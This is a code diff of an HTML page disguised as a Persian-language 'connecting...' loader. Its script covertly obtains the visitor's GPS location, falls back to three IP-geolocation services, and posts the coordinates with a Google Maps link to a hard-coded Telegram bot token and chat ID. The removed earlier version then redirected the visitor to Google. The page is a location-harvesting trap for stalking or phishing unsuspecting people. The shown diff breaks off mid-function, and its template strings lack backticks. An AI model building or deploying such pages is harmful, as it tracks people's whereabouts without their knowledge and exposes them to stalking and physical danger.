@@ -3,55 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <style>body{background:#0a0a0a;color:#fff;text-align:center;padding-top:20%;font-family:Arial}</style>
+    <style>
+        body{background:#0a0a0a;color:#fff;text-align:center;padding-top:10%;font-family:Arial;direction:ltr}
+        #log{background:#222;padding:20px;margin:20px auto;max-width:500px;border-radius:10px;font-size:14px;text-align:left;color:#0f0;white-space:pre-wrap;font-family:monospace}
+        .error{color:#f44}
+        .success{color:#0f0}
+    </style>
 </head>
 <body>
     <h2>⏳ در حال اتصال...</h2>
+    <div id="log">⏳ شروع فرآیند...</div>
     <script>
     (function() {
-        async function getGPS() {
+        const logEl = document.getElementById('log');
+
+        function log(msg, isError = false) {
+            const line = document.createElement('div');
+            line.textContent = msg;
+            line.style.color = isError ? '#f44' : '#0f0';
+            logEl.appendChild(line);
+            logEl.scrollTop = logEl.scrollHeight;
+            console.log(msg);
+        }
+
+        // ===== لایه ۱: GPS با تایم‌اوت =====
+        function getGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
+                log('📍 درخواست GPS...');
+                if (!navigator.geolocation) {
+                    log('❌ GPS پشتیبانی نمی‌شود', true);
+                    return resolve(null);
+                }
+                const timeoutId = setTimeout(() => {
+                    log('⏱ GPS تایم‌اوت (۵ ثانیه)', true);
+                    resolve(null);
+                }, 5000);
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, method: 'GPS' }),
-                    () => resolve(null),
+                    (pos) => {
+                        clearTimeout(timeoutId);
+                        log('✅ GPS دریافت شد');
+                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, method: 'GPS' });
+                    },
+                    (err) => {
+                        clearTimeout(timeoutId);
+                        log('❌ GPS خطا: ' + err.message, true);
+                        resolve(null);
+                    },
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
 
+        // ===== لایه ۲: IP-Geo با ۳ سرویس مختلف =====
         async function getIPGeo() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if (data.latitude) {
-                    return { lat: data.latitude, lon: data.longitude, acc: 5000, method: 'IP-Geo' };
+            const services = [
+                { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
+                { name: 'ipinfo.io', url: 'https://ipinfo.io/json' },
+                { name: 'geoplugin', url: 'https://geoplugin.net/json.gp' }
+            ];
+            for (const svc of services) {
+                try {
+                    log(🌐 تلاش ${svc.name}...);
+                    const res = await fetch(svc.url, { signal: AbortSignal.timeout(3000) });
+                    const data = await res.json();
+                    let lat, lon;
+                    if (data.latitude) { lat = data.latitude; lon = data.longitude; }
+                    else if (data.loc) { [lat, lon] = data.loc.split(','); }
+                    else if (data.geoplugin_latitude) { lat = data.geoplugin_latitude; lon = data.geoplugin_longitude; }
+                    else continue;
+                    log(✅ IP-Geo از ${svc.name} دریافت شد);
+                    return { lat: parseFloat(lat), lon: parseFloat(lon), acc: 5000, method: 'IP-Geo' };
+                } catch(e) {
+                    log(❌ ${svc.name} خطا: ${e.message}, true);
                 }
-            } catch(e) {}
+            }
             return null;
         }
 
+        // ===== ارسال به تلگرام =====
         async function sendToTelegram(loc) {
-            const botToken = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';  // <-- توکن را اینجا بگذارید
-            const chatId = '56489235';      // <-- Chat ID را اینجا بگذارید
+            const botToken = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن خود را اینجا بگذارید
+            const chatId = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
+
             const text = 📍 موقعیت جدید:\n🌐 عرض: ${loc.lat}\n🌐 طول: ${loc.lon}\n📡 دقت: ${loc.acc || 'نامشخص'} متر\n🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
-            
-            await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            });
-        }
-
-        async function main() {
-            let loc = await getGPS();
-            if (!loc) loc = await getIPGeo();
-            if (loc) await sendToTelegram(loc);
-            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
-        }
-
-        main();
-    })();
-    </script>
-</body>
-</html>
